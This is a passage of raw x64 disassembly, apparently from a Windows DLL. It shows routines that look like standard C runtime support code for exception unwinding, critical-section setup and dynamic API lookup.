   180005611:	33 c0                	xor    %eax,%eax
   180005613:	48 8d 48 08          	lea    0x8(%rax),%rcx
   180005617:	48 8d 15 1a 54 01 00 	lea    0x1541a(%rip),%rdx        # 0x18001aa38
   18000561e:	e8 ed e1 ff ff       	call   0x180003810
   180005623:	85 c0                	test   %eax,%eax
   180005625:	74 21                	je     0x180005648
   180005627:	ff c5                	inc    %ebp
   180005629:	48 83 c6 14          	add    $0x14,%rsi
   18000562d:	3b 2f                	cmp    (%rdi),%ebp
   18000562f:	7c b2                	jl     0x1800055e3
   180005631:	32 c0                	xor    %al,%al
   180005633:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   180005638:	48 8b 6c 24 38       	mov    0x38(%rsp),%rbp
   18000563d:	48 8b 74 24 40       	mov    0x40(%rsp),%rsi
   180005642:	48 83 c4 20          	add    $0x20,%rsp
   180005646:	5f                   	pop    %rdi
   180005647:	c3                   	ret
   180005648:	b0 01                	mov    $0x1,%al
   18000564a:	eb e7                	jmp    0x180005633
   18000564c:	4c 8b 02             	mov    (%rdx),%r8
   18000564f:	4c 8d 1d aa a9 ff ff 	lea    -0x5656(%rip),%r11        # 0x180000000
   180005656:	4c 8b d1             	mov    %rcx,%r10
   180005659:	4c 8b ca             	mov    %rdx,%r9
   18000565c:	41 0f b6 08          	movzbl (%r8),%ecx
   180005660:	83 e1 0f             	and    $0xf,%ecx
   180005663:	4a 0f be 84 19 c0 03 	movsbq 0x103c0(%rcx,%r11,1),%rax
   18000566a:	01 00 
   18000566c:	42 8a 8c 19 d0 03 01 	mov    0x103d0(%rcx,%r11,1),%cl
   180005673:	00 
   180005674:	4c 2b c0             	sub    %rax,%r8
   180005677:	41 8b 40 fc          	mov    -0x4(%r8),%eax
   18000567b:	d3 e8                	shr    %cl,%eax
   18000567d:	8b c8                	mov    %eax,%ecx
   18000567f:	4c 89 02             	mov    %r8,(%rdx)
   180005682:	83 e1 03             	and    $0x3,%ecx
   180005685:	c1 e8 02             	shr    $0x2,%eax
   180005688:	41 89 4a 14          	mov    %ecx,0x14(%r10)
   18000568c:	41 89 42 10          	mov    %eax,0x10(%r10)
   180005690:	83 f9 01             	cmp    $0x1,%ecx
   180005693:	74 1b                	je     0x1800056b0
   180005695:	83 f9 02             	cmp    $0x2,%ecx
   180005698:	74 16                	je     0x1800056b0
   18000569a:	83 f9 03             	cmp    $0x3,%ecx
   18000569d:	75 4a                	jne    0x1800056e9
   18000569f:	48 8b 02             	mov    (%rdx),%rax
   1800056a2:	8b 08                	mov    (%rax),%ecx
   1800056a4:	48 83 c0 04          	add    $0x4,%rax
   1800056a8:	48 89 02             	mov    %rax,(%rdx)
   1800056ab:	41 89 4a 18          	mov    %ecx,0x18(%r10)
   1800056af:	c3                   	ret
   1800056b0:	48 8b 02             	mov    (%rdx),%rax
   1800056b3:	8b 08                	mov    (%rax),%ecx
   1800056b5:	48 83 c0 04          	add    $0x4,%rax
   1800056b9:	48 89 02             	mov    %rax,(%rdx)
   1800056bc:	41 89 4a 18          	mov    %ecx,0x18(%r10)
   1800056c0:	48 8b 12             	mov    (%rdx),%rdx
   1800056c3:	0f b6 0a             	movzbl (%rdx),%ecx
   1800056c6:	83 e1 0f             	and    $0xf,%ecx
   1800056c9:	4a 0f be 84 19 c0 03 	movsbq 0x103c0(%rcx,%r11,1),%rax
   1800056d0:	01 00 
   1800056d2:	42 8a 8c 19 d0 03 01 	mov    0x103d0(%rcx,%r11,1),%cl
   1800056d9:	00 
   1800056da:	48 2b d0             	sub    %rax,%rdx
   1800056dd:	8b 42 fc             	mov    -0x4(%rdx),%eax
   1800056e0:	d3 e8                	shr    %cl,%eax
   1800056e2:	49 89 11             	mov    %rdx,(%r9)
   1800056e5:	41 89 42 1c          	mov    %eax,0x1c(%r10)
   1800056e9:	c3                   	ret
   1800056ea:	cc                   	int3
   1800056eb:	cc                   	int3
   1800056ec:	48 8b c2             	mov    %rdx,%rax
   1800056ef:	49 8b d0             	mov    %r8,%rdx
   1800056f2:	48 ff e0             	rex.W jmp *%rax
   1800056f5:	cc                   	int3
   1800056f6:	cc                   	int3
   1800056f7:	cc                   	int3
   1800056f8:	49 8b c0             	mov    %r8,%rax
   1800056fb:	4c 8b d2             	mov    %rdx,%r10
   1800056fe:	48 8b d0             	mov    %rax,%rdx
   180005701:	45 8b c1             	mov    %r9d,%r8d
   180005704:	49 ff e2             	rex.WB jmp *%r10
   180005707:	cc                   	int3
   180005708:	4c 8b dc             	mov    %rsp,%r11
   18000570b:	49 89 5b 18          	mov    %rbx,0x18(%r11)
   18000570f:	4d 89 4b 20          	mov    %r9,0x20(%r11)
   180005713:	89 54 24 10          	mov    %edx,0x10(%rsp)
   180005717:	55                   	push   %rbp
   180005718:	56                   	push   %rsi
   180005719:	57                   	push   %rdi
   18000571a:	41 54                	push   %r12
   18000571c:	41 55                	push   %r13
   18000571e:	41 56                	push   %r14
   180005720:	41 57                	push   %r15
   180005722:	48 83 ec 20          	sub    $0x20,%rsp
   180005726:	48 8b 41 08          	mov    0x8(%rcx),%rax
   18000572a:	40 32 ed             	xor    %bpl,%bpl
   18000572d:	45 32 f6             	xor    %r14b,%r14b
   180005730:	49 89 43 08          	mov    %rax,0x8(%r11)
   180005734:	33 ff                	xor    %edi,%edi
   180005736:	4d 8b e1             	mov    %r9,%r12
   180005739:	45 8b e8             	mov    %r8d,%r13d
   18000573c:	48 8b d9             	mov    %rcx,%rbx
   18000573f:	48 8d 70 ff          	lea    -0x1(%rax),%rsi
   180005743:	4c 8b fe             	mov    %rsi,%r15
   180005746:	39 39                	cmp    %edi,(%rcx)
   180005748:	7e 43                	jle    0x18000578d
   18000574a:	45 8b 63 10          	mov    0x10(%r11),%r12d
   18000574e:	41 3b fc             	cmp    %r12d,%edi
   180005751:	75 06                	jne    0x180005759
   180005753:	48 8b f0             	mov    %rax,%rsi
   180005756:	40 b5 01             	mov    $0x1,%bpl
   180005759:	41 3b fd             	cmp    %r13d,%edi
   18000575c:	75 06                	jne    0x180005764
   18000575e:	4c 8b f8             	mov    %rax,%r15
   180005761:	41 b6 01             	mov    $0x1,%r14b
   180005764:	40 84 ed             	test   %bpl,%bpl
   180005767:	74 05                	je     0x18000576e
   180005769:	45 84 f6             	test   %r14b,%r14b
   18000576c:	75 1a                	jne    0x180005788
   18000576e:	48 8d 54 24 60       	lea    0x60(%rsp),%rdx
   180005773:	48 8b cb             	mov    %rbx,%rcx
   180005776:	e8 d1 fe ff ff       	call   0x18000564c
   18000577b:	ff c7                	inc    %edi
   18000577d:	3b 3b                	cmp    (%rbx),%edi
   18000577f:	7d 07                	jge    0x180005788
   180005781:	48 8b 44 24 60       	mov    0x60(%rsp),%rax
   180005786:	eb c6                	jmp    0x18000574e
   180005788:	4c 8b 64 24 78       	mov    0x78(%rsp),%r12
   18000578d:	49 8b 04 24          	mov    (%r12),%rax
   180005791:	49 89 74 24 08       	mov    %rsi,0x8(%r12)
   180005796:	0f 10 03             	movups (%rbx),%xmm0
   180005799:	0f 11 00             	movups %xmm0,(%rax)
   18000579c:	0f 10 4b 10          	movups 0x10(%rbx),%xmm1
   1800057a0:	0f 11 48 10          	movups %xmm1,0x10(%rax)
   1800057a4:	48 8b 84 24 80 00 00 	mov    0x80(%rsp),%rax
   1800057ab:	00 
   1800057ac:	48 8b 08             	mov    (%rax),%rcx
   1800057af:	4c 89 78 08          	mov    %r15,0x8(%rax)
   1800057b3:	0f 10 03             	movups (%rbx),%xmm0
   1800057b6:	0f 11 01             	movups %xmm0,(%rcx)
   1800057b9:	0f 10 4b 10          	movups 0x10(%rbx),%xmm1
   1800057bd:	48 8b 5c 24 70       	mov    0x70(%rsp),%rbx
   1800057c2:	0f 11 49 10          	movups %xmm1,0x10(%rcx)
   1800057c6:	48 83 c4 20          	add    $0x20,%rsp
   1800057ca:	41 5f                	pop    %r15
   1800057cc:	41 5e                	pop    %r14
   1800057ce:	41 5d                	pop    %r13
   1800057d0:	41 5c                	pop    %r12
   1800057d2:	5f                   	pop    %rdi
   1800057d3:	5e                   	pop    %rsi
   1800057d4:	5d                   	pop    %rbp
   1800057d5:	c3                   	ret
   1800057d6:	cc                   	int3
   1800057d7:	cc                   	int3
   1800057d8:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1800057dd:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   1800057e2:	57                   	push   %rdi
   1800057e3:	48 83 ec 30          	sub    $0x30,%rsp
   1800057e7:	48 8b 7c 24 60       	mov    0x60(%rsp),%rdi
   1800057ec:	49 8b f0             	mov    %r8,%rsi
   1800057ef:	8b da                	mov    %edx,%ebx
   1800057f1:	4c 8b 57 08          	mov    0x8(%rdi),%r10
   1800057f5:	4d 3b 50 08          	cmp    0x8(%r8),%r10
   1800057f9:	0f 87 8d 00 00 00    	ja     0x18000588c
   1800057ff:	4c 39 51 08          	cmp    %r10,0x8(%rcx)
   180005803:	0f 87 83 00 00 00    	ja     0x18000588c
   180005809:	49 8b 40 08          	mov    0x8(%r8),%rax
   18000580d:	49 8b d2             	mov    %r10,%rdx
   180005810:	48 2b 51 08          	sub    0x8(%rcx),%rdx
   180005814:	49 2b c2             	sub    %r10,%rax
   180005817:	48 3b d0             	cmp    %rax,%rdx
   18000581a:	7d 35                	jge    0x180005851
   18000581c:	0f 10 01             	movups (%rcx),%xmm0
   18000581f:	0f 11 44 24 20       	movups %xmm0,0x20(%rsp)
   180005824:	66 0f 73 d8 08       	psrldq $0x8,%xmm0
   180005829:	66 48 0f 7e c0       	movq   %xmm0,%rax
   18000582e:	4c 3b d0             	cmp    %rax,%r10
   180005831:	76 55                	jbe    0x180005888
   180005833:	48 8b 4c 24 20       	mov    0x20(%rsp),%rcx
   180005838:	48 8d 54 24 28       	lea    0x28(%rsp),%rdx
   18000583d:	e8 0a fe ff ff       	call   0x18000564c
   180005842:	48 8b 44 24 28       	mov    0x28(%rsp),%rax
   180005847:	ff c3                	inc    %ebx
   180005849:	48 39 47 08          	cmp    %rax,0x8(%rdi)
   18000584d:	77 e4                	ja     0x180005833
   18000584f:	eb 37                	jmp    0x180005888
   180005851:	0f 10 07             	movups (%rdi),%xmm0
   180005854:	41 8b d9             	mov    %r9d,%ebx
   180005857:	0f 11 44 24 20       	movups %xmm0,0x20(%rsp)
   18000585c:	66 0f 73 d8 08       	psrldq $0x8,%xmm0
   180005861:	66 48 0f 7e c0       	movq   %xmm0,%rax
   180005866:	49 39 40 08          	cmp    %rax,0x8(%r8)
   18000586a:	76 1c                	jbe    0x180005888
   18000586c:	48 8b 4c 24 20       	mov    0x20(%rsp),%rcx
   180005871:	48 8d 54 24 28       	lea    0x28(%rsp),%rdx
   180005876:	e8 d1 fd ff ff       	call   0x18000564c
   18000587b:	48 8b 4c 24 28       	mov    0x28(%rsp),%rcx
   180005880:	ff cb                	dec    %ebx
   180005882:	48 39 4e 08          	cmp    %rcx,0x8(%rsi)
   180005886:	77 e4                	ja     0x18000586c
   180005888:	8b c3                	mov    %ebx,%eax
   18000588a:	eb 03                	jmp    0x18000588f
   18000588c:	83 c8 ff             	or     $0xffffffff,%eax
   18000588f:	48 8b 5c 24 40       	mov    0x40(%rsp),%rbx
   180005894:	48 8b 74 24 48       	mov    0x48(%rsp),%rsi
   180005899:	48 83 c4 30          	add    $0x30,%rsp
   18000589d:	5f                   	pop    %rdi
   18000589e:	c3                   	ret
   18000589f:	cc                   	int3
   1800058a0:	48 83 ec 28          	sub    $0x28,%rsp
   1800058a4:	45 33 c0             	xor    %r8d,%r8d
   1800058a7:	48 8d 0d d2 58 01 00 	lea    0x158d2(%rip),%rcx        # 0x18001b180
   1800058ae:	ba a0 0f 00 00       	mov    $0xfa0,%edx
   1800058b3:	e8 50 03 00 00       	call   0x180005c08
   1800058b8:	85 c0                	test   %eax,%eax
   1800058ba:	74 0a                	je     0x1800058c6
   1800058bc:	ff 05 e6 58 01 00    	incl   0x158e6(%rip)        # 0x18001b1a8
   1800058c2:	b0 01                	mov    $0x1,%al
   1800058c4:	eb 07                	jmp    0x1800058cd
   1800058c6:	e8 09 00 00 00       	call   0x1800058d4
   1800058cb:	32 c0                	xor    %al,%al
   1800058cd:	48 83 c4 28          	add    $0x28,%rsp
   1800058d1:	c3                   	ret
   1800058d2:	cc                   	int3
   1800058d3:	cc                   	int3
   1800058d4:	40 53                	rex push %rbx
   1800058d6:	48 83 ec 20          	sub    $0x20,%rsp
   1800058da:	8b 1d c8 58 01 00    	mov    0x158c8(%rip),%ebx        # 0x18001b1a8
   1800058e0:	eb 1d                	jmp    0x1800058ff
   1800058e2:	48 8d 05 97 58 01 00 	lea    0x15897(%rip),%rax        # 0x18001b180
   1800058e9:	ff cb                	dec    %ebx
   1800058eb:	48 8d 0c 9b          	lea    (%rbx,%rbx,4),%rcx
   1800058ef:	48 8d 0c c8          	lea    (%rax,%rcx,8),%rcx
   1800058f3:	ff 15 ef a7 00 00    	call   *0xa7ef(%rip)        # 0x1800100e8
   1800058f9:	ff 0d a9 58 01 00    	decl   0x158a9(%rip)        # 0x18001b1a8
   1800058ff:	85 db                	test   %ebx,%ebx
   180005901:	75 df                	jne    0x1800058e2
   180005903:	b0 01                	mov    $0x1,%al
   180005905:	48 83 c4 20          	add    $0x20,%rsp
   180005909:	5b                   	pop    %rbx
   18000590a:	c3                   	ret
   18000590b:	cc                   	int3
   18000590c:	cc                   	int3
   18000590d:	cc                   	int3
   18000590e:	cc                   	int3
   18000590f:	cc                   	int3
   180005910:	cc                   	int3
   180005911:	cc                   	int3
   180005912:	cc                   	int3
   180005913:	cc                   	int3
   180005914:	cc                   	int3
   180005915:	cc                   	int3
   180005916:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   18000591d:	00 00 00 
   180005920:	48 89 4c 24 08       	mov    %rcx,0x8(%rsp)
   180005925:	48 89 54 24 18       	mov    %rdx,0x18(%rsp)
   18000592a:	44 89 44 24 10       	mov    %r8d,0x10(%rsp)
   18000592f:	49 c7 c1 20 05 93 19 	mov    $0x19930520,%r9
   180005936:	eb 08                	jmp    0x180005940
   180005938:	cc                   	int3
   180005939:	cc                   	int3
   18000593a:	cc                   	int3
   18000593b:	cc                   	int3
   18000593c:	cc                   	int3
   18000593d:	cc                   	int3
   18000593e:	66 90                	xchg   %ax,%ax
   180005940:	c3                   	ret
   180005941:	cc                   	int3
   180005942:	cc                   	int3
   180005943:	cc                   	int3
   180005944:	cc                   	int3
   180005945:	cc                   	int3
   180005946:	cc                   	int3
   180005947:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   18000594e:	00 00 
   180005950:	c3                   	ret
   180005951:	cc                   	int3
   180005952:	cc                   	int3
   180005953:	cc                   	int3
   180005954:	48 8b 05 fd a8 00 00 	mov    0xa8fd(%rip),%rax        # 0x180010258
   18000595b:	48 8d 15 6e ce ff ff 	lea    -0x3192(%rip),%rdx        # 0x1800027d0
   180005962:	48 3b c2             	cmp    %rdx,%rax
   180005965:	74 23                	je     0x18000598a
   180005967:	65 48 8b 04 25 30 00 	mov    %gs:0x30,%rax
   18000596e:	00 00 
   180005970:	48 8b 89 98 00 00 00 	mov    0x98(%rcx),%rcx
   180005977:	48 3b 48 10          	cmp    0x10(%rax),%rcx
   18000597b:	72 06                	jb     0x180005983
   18000597d:	48 3b 48 08          	cmp    0x8(%rax),%rcx
   180005981:	76 07                	jbe    0x18000598a
   180005983:	b9 0d 00 00 00       	mov    $0xd,%ecx
   180005988:	cd 29                	int    $0x29
   18000598a:	c3                   	ret
   18000598b:	cc                   	int3
   18000598c:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   180005991:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   180005996:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   18000599b:	57                   	push   %rdi
   18000599c:	41 54                	push   %r12
   18000599e:	41 55                	push   %r13
   1800059a0:	41 56                	push   %r14
   1800059a2:	41 57                	push   %r15
   1800059a4:	48 83 ec 20          	sub    $0x20,%rsp
   1800059a8:	8b f9                	mov    %ecx,%edi
   1800059aa:	4c 8d 3d 4f a6 ff ff 	lea    -0x59b1(%rip),%r15        # 0x180000000
   1800059b1:	49 83 ce ff          	or     $0xffffffffffffffff,%r14
   1800059b5:	4d 8b e1             	mov    %r9,%r12
   1800059b8:	49 8b e8             	mov    %r8,%rbp
   1800059bb:	4c 8b ea             	mov    %rdx,%r13
   1800059be:	49 8b 84 ff 30 b2 01 	mov    0x1b230(%r15,%rdi,8),%rax
   1800059c5:	00 
   1800059c6:	90                   	nop
   1800059c7:	49 3b c6             	cmp    %r14,%rax
   1800059ca:	0f 84 eb 00 00 00    	je     0x180005abb
   1800059d0:	48 85 c0             	test   %rax,%rax
   1800059d3:	0f 85 e4 00 00 00    	jne    0x180005abd
   1800059d9:	4d 3b c1             	cmp    %r9,%r8
   1800059dc:	0f 84 d1 00 00 00    	je     0x180005ab3
   1800059e2:	8b 75 00             	mov    0x0(%rbp),%esi
   1800059e5:	49 8b 9c f7 18 b2 01 	mov    0x1b218(%r15,%rsi,8),%rbx
   1800059ec:	00 
   1800059ed:	90                   	nop
   1800059ee:	48 85 db             	test   %rbx,%rbx
   1800059f1:	74 0b                	je     0x1800059fe
   1800059f3:	49 3b de             	cmp    %r14,%rbx
   1800059f6:	0f 85 99 00 00 00    	jne    0x180005a95
   1800059fc:	eb 6b                	jmp    0x180005a69
   1800059fe:	4d 8b bc f7 68 12 01 	mov    0x11268(%r15,%rsi,8),%r15
   180005a05:	00 
   180005a06:	33 d2                	xor    %edx,%edx
   180005a08:	49 8b cf             	mov    %r15,%rcx
   180005a0b:	41 b8 00 08 00 00    	mov    $0x800,%r8d
   180005a11:	ff 15 11 a7 00 00    	call   *0xa711(%rip)        # 0x180010128
   180005a17:	48 8b d8             	mov    %rax,%rbx
   180005a1a:	48 85 c0             	test   %rax,%rax
   180005a1d:	75 56                	jne    0x180005a75
   180005a1f:	ff 15 9b a6 00 00    	call   *0xa69b(%rip)        # 0x1800100c0
   180005a25:	83 f8 57             	cmp    $0x57,%eax
   180005a28:	75 2d                	jne    0x180005a57
   180005a2a:	44 8d 43 07          	lea    0x7(%rbx),%r8d
   180005a2e:	49 8b cf             	mov    %r15,%rcx
   180005a31:	48 8d 15 e0 b8 00 00 	lea    0xb8e0(%rip),%rdx        # 0x180011318
   180005a38:	e8 83 1f 00 00       	call   0x1800079c0
   180005a3d:	85 c0                	test   %eax,%eax
   180005a3f:	74 16                	je     0x180005a57
   180005a41:	45 33 c0             	xor    %r8d,%r8d
   180005a44:	33 d2                	xor    %edx,%edx
   180005a46:	49 8b cf             	mov    %r15,%rcx
   180005a49:	ff 15 d9 a6 00 00    	call   *0xa6d9(%rip)        # 0x180010128
   180005a4f:	48 8b d8             	mov    %rax,%rbx
   180005a52:	48 85 c0             	test   %rax,%rax
   180005a55:	75 1e                	jne    0x180005a75
   180005a57:	49 8b c6             	mov    %r14,%rax
   180005a5a:	4c 8d 3d 9f a5 ff ff 	lea    -0x5a61(%rip),%r15        # 0x180000000
   180005a61:	49 87 84 f7 18 b2 01 	xchg   %rax,0x1b218(%r15,%rsi,8)
   180005a68:	00 
   180005a69:	48 83 c5 04          	add    $0x4,%rbp
   180005a6d:	49 3b ec             	cmp    %r12,%rbp
   180005a70:	e9 67 ff ff ff       	jmp    0x1800059dc
   180005a75:	48 8b c3             	mov    %rbx,%rax
   180005a78:	4c 8d 3d 81 a5 ff ff 	lea    -0x5a7f(%rip),%r15        # 0x180000000
   180005a7f:	49 87 84 f7 18 b2 01 	xchg   %rax,0x1b218(%r15,%rsi,8)
   180005a86:	00 
   180005a87:	48 85 c0             	test   %rax,%rax
   180005a8a:	74 09                	je     0x180005a95
   180005a8c:	48 8b cb             	mov    %rbx,%rcx
   180005a8f:	ff 15 83 a6 00 00    	call   *0xa683(%rip)        # 0x180010118
   180005a95:	49 8b d5             	mov    %r13,%rdx
   180005a98:	48 8b cb             	mov    %rbx,%rcx
   180005a9b:	ff 15 7f a6 00 00    	call   *0xa67f(%rip)        # 0x180010120
   180005aa1:	48 85 c0             	test   %rax,%rax
   180005aa4:	74 0d                	je     0x180005ab3
   180005aa6:	48 8b c8             	mov    %rax,%rcx
   180005aa9:	49 87 8c ff 30 b2 01 	xchg   %rcx,0x1b230(%r15,%rdi,8)
   180005ab0:	00 
   180005ab1:	eb 0a                	jmp    0x180005abd
   180005ab3:	4d 87 b4 ff 30 b2 01 	xchg   %r14,0x1b230(%r15,%rdi,8)
   180005aba:	00 
   180005abb:	33 c0                	xor    %eax,%eax
   180005abd:	48 8b 5c 24 50       	mov    0x50(%rsp),%rbx
   180005ac2:	48 8b 6c 24 58       	mov    0x58(%rsp),%rbp
   180005ac7:	48 8b 74 24 60       	mov    0x60(%rsp),%rsi
   180005acc:	48 83 c4 20          	add    $0x20,%rsp
   180005ad0:	41 5f                	pop    %r15
   180005ad2:	41 5e                	pop    %r14
   180005ad4:	41 5d                	pop    %r13
   180005ad6:	41 5c                	pop    %r12
   180005ad8:	5f                   	pop    %rdi
   180005ad9:	c3                   	ret
   180005ada:	cc                   	int3
   180005adb:	cc                   	int3
   180005adc:	40 53                	rex push %rbx
   180005ade:	48 83 ec 20          	sub    $0x20,%rsp
   180005ae2:	48 8b d9             	mov    %rcx,%rbx
   180005ae5:	4c 8d 0d 44 b8 00 00 	lea    0xb844(%rip),%r9        # 0x180011330
   180005aec:	33 c9                	xor    %ecx,%ecx
   180005aee:	4c 8d 05 33 b8 00 00 	lea    0xb833(%rip),%r8        # 0x180011328
   180005af5:	48 8d 15 34 b8 00 00 	lea    0xb834(%rip),%rdx        # 0x180011330
   180005afc:	e8 8b fe ff ff       	call   0x18000598c
   180005b01:	48 85 c0             	test   %rax,%rax
   180005b04:	74 0f                	je     0x180005b15
   180005b06:	48 8b cb             	mov    %rbx,%rcx
   180005b09:	48 83 c4 20          	add    $0x20,%rsp
   180005b0d:	5b                   	pop    %rbx
   180005b0e:	48 ff 25 53 a7 00 00 	rex.W jmp *0xa753(%rip)        # 0x180010268
   180005b15:	48 83 c4 20          	add    $0x20,%rsp
   180005b19:	5b                   	pop    %rbx
   180005b1a:	48 ff 25 d7 a5 00 00 	rex.W jmp *0xa5d7(%rip)        # 0x1800100f8
   180005b21:	cc                   	int3
   180005b22:	cc                   	int3
   180005b23:	cc                   	int3
   180005b24:	40 53                	rex push %rbx
   180005b26:	48 83 ec 20          	sub    $0x20,%rsp
   180005b2a:	8b d9                	mov    %ecx,%ebx
   180005b2c:	4c 8d 0d 15 b8 00 00 	lea    0xb815(%rip),%r9        # 0x180011348
   180005b33:	b9 01 00 00 00       	mov    $0x1,%ecx
   180005b38:	4c 8d 05 01 b8 00 00 	lea    0xb801(%rip),%r8        # 0x180011340
   180005b3f:	48 8d 15 02 b8 00 00 	lea    0xb802(%rip),%rdx        # 0x180011348
   180005b46:	e8 41 fe ff ff       	call   0x18000598c
   180005b4b:	8b cb                	mov    %ebx,%ecx
   180005b4d:	48 85 c0             	test   %rax,%rax
   180005b50:	74 0c                	je     0x180005b5e
   180005b52:	48 83 c4 20          	add    $0x20,%rsp
   180005b56:	5b                   	pop    %rbx
   180005b57:	48 ff 25 0a a7 00 00 	rex.W jmp *0xa70a(%rip)        # 0x180010268
   180005b5e:	48 83 c4 20          	add    $0x20,%rsp
   180005b62:	5b                   	pop    %rbx
   180005b63:	48 ff 25 a6 a5 00 00 	rex.W jmp *0xa5a6(%rip)        # 0x180010110
   180005b6a:	cc                   	int3
   180005b6b:	cc                   	int3
   180005b6c:	40 53                	rex push %rbx
   180005b6e:	48 83 ec 20          	sub    $0x20,%rsp
   180005b72:	8b d9                	mov    %ecx,%ebx
   180005b74:	4c 8d 0d dd b7 00 00 	lea    0xb7dd(%rip),%r9        # 0x180011358
   180005b7b:	b9 02 00 00 00       	mov    $0x2,%ecx
   180005b80:	4c 8d 05 c9 b7 00 00 	lea    0xb7c9(%rip),%r8        # 0x180011350
   180005b87:	48 8d 15 ca b7 00 00 	lea    0xb7ca(%rip),%rdx        # 0x180011358
   180005b8e:	e8 f9 fd ff ff       	call   0x18000598c
   180005b93:	8b cb                	mov    %ebx,%ecx
   180005b95:	48 85 c0             	test   %rax,%rax
   180005b98:	74 0c                	je     0x180005ba6
   180005b9a:	48 83 c4 20          	add    $0x20,%rsp
   180005b9e:	5b                   	pop    %rbx
   180005b9f:	48 ff 25 c2 a6 00 00 	rex.W jmp *0xa6c2(%rip)        # 0x180010268
   180005ba6:	48 83 c4 20          	add    $0x20,%rsp
   180005baa:	5b                   	pop    %rbx
   180005bab:	48 ff 25 4e a5 00 00 	rex.W jmp *0xa54e(%rip)        # 0x180010100
   180005bb2:	cc                   	int3
   180005bb3:	cc                   	int3
   180005bb4:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   180005bb9:	57                   	push   %rdi
   180005bba:	48 83 ec 20          	sub    $0x20,%rsp
   180005bbe:	48 8b da             	mov    %rdx,%rbx
   180005bc1:	4c 8d 0d a8 b7 00 00 	lea    0xb7a8(%rip),%r9        # 0x180011370
   180005bc8:	8b f9                	mov    %ecx,%edi
   180005bca:	48 8d 15 9f b7 00 00 	lea    0xb79f(%rip),%rdx        # 0x180011370
   180005bd1:	b9 03 00 00 00       	mov    $0x3,%ecx
   180005bd6:	4c 8d 05 8b b7 00 00 	lea    0xb78b(%rip),%r8        # 0x180011368
   180005bdd:	e8 aa fd ff ff       	call   0x18000598c
   180005be2:	48 8b d3             	mov    %rbx,%rdx
   180005be5:	8b cf                	mov    %edi,%ecx
   180005be7:	48 85 c0             	test   %rax,%rax
   180005bea:	74 08                	je     0x180005bf4
   180005bec:	ff 15 76 a6 00 00    	call   *0xa676(%rip)        # 0x180010268
   180005bf2:	eb 06                	jmp    0x180005bfa
   180005bf4:	ff 15 0e a5 00 00    	call   *0xa50e(%rip)        # 0x180010108
   180005bfa:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   180005bff:	48 83 c4 20          	add    $0x20,%rsp
   180005c03:	5f                   	pop    %rdi
   180005c04:	c3                   	ret
   180005c05:	cc                   	int3
   180005c06:	cc                   	int3
   180005c07:	cc                   	int3
   180005c08:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   180005c0d:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   180005c12:	57                   	push   %rdi
   180005c13:	48 83 ec 20          	sub    $0x20,%rsp
   180005c17:	41 8b f0             	mov    %r8d,%esi
   180005c1a:	4c 8d 0d 67 b7 00 00 	lea    0xb767(%rip),%r9        # 0x180011388
   180005c21:	8b da                	mov    %edx,%ebx
   180005c23:	4c 8d 05 56 b7 00 00 	lea    0xb756(%rip),%r8        # 0x180011380
   180005c2a:	48 8b f9             	mov    %rcx,%rdi
   180005c2d:	48 8d 15 54 b7 00 00 	lea    0xb754(%rip),%rdx        # 0x180011388
   180005c34:	b9 04 00 00 00       	mov    $0x4,%ecx
   180005c39:	e8 4e fd ff ff       	call   0x18000598c
   180005c3e:	8b d3                	mov    %ebx,%edx
   180005c40:	48 8b cf             	mov    %rdi,%rcx
   180005c43:	48 85 c0             	test   %rax,%rax
   180005c46:	74 0b                	je     0x180005c53
   180005c48:	44 8b c6             	mov    %esi,%r8d
   180005c4b:	ff 15 17 a6 00 00    	call   *0xa617(%rip)        # 0x180010268
   180005c51:	eb 06                	jmp    0x180005c59
   180005c53:	ff 15 97 a4 00 00    	call   *0xa497(%rip)        # 0x1800100f0
   180005c59:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   180005c5e:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   180005c63:	48 83 c4 20          	add    $0x20,%rsp
   180005c67:	5f                   	pop    %rdi
   180005c68:	c3                   	ret
   180005c69:	cc                   	int3
   180005c6a:	cc                   	int3
   180005c6b:	cc                   	int3
   180005c6c:	cc                   	int3
   180005c6d:	cc                   	int3
   180005c6e:	cc                   	int3
   180005c6f:	cc                   	int3
   180005c70:	cc                   	int3
   180005c71:	cc                   	int3
   180005c72:	cc                   	int3
   180005c73:	cc                   	int3
   180005c74:	cc                   	int3
   180005c75:	cc                   	int3
   180005c76:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   180005c7d:	00 00 00 
   180005c80:	48 83 ec 28          	sub    $0x28,%rsp
   180005c84:	48 89 4c 24 30       	mov    %rcx,0x30(%rsp)
   180005c89:	48 89 54 24 38       	mov    %rdx,0x38(%rsp)
   180005c8e:	44 89 44 24 40       	mov    %r8d,0x40(%rsp)
   180005c93:	48 8b 12             	mov    (%rdx),%rdx
   180005c96:	48 8b c1             	mov    %rcx,%rax
   180005c99:	e8 82 fc ff ff       	call   0x180005920
   180005c9e:	ff d0                	call   *%rax
   180005ca0:	e8 ab fc ff ff       	call   0x180005950
   180005ca5:	48 8b c8             	mov    %rax,%rcx
   180005ca8:	48 8b 54 24 38       	mov    0x38(%rsp),%rdx
   180005cad:	48 8b 12             	mov    (%rdx),%rdx
   180005cb0:	41 b8 02 00 00 00    	mov    $0x2,%r8d
   180005cb6:	e8 65 fc ff ff       	call   0x180005920
   180005cbb:	48 83 c4 28          	add    $0x28,%rsp
   180005cbf:	c3                   	ret
   180005cc0:	cc                   	int3
   180005cc1:	cc                   	int3
   180005cc2:	cc                   	int3
   180005cc3:	cc                   	int3
   180005cc4:	cc                   	int3
   180005cc5:	cc                   	int3
   180005cc6:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   180005ccd:	00 00 00 
   180005cd0:	48 83 ec 28          	sub    $0x28,%rsp
   180005cd4:	48 89 4c 24 30       	mov    %rcx,0x30(%rsp)
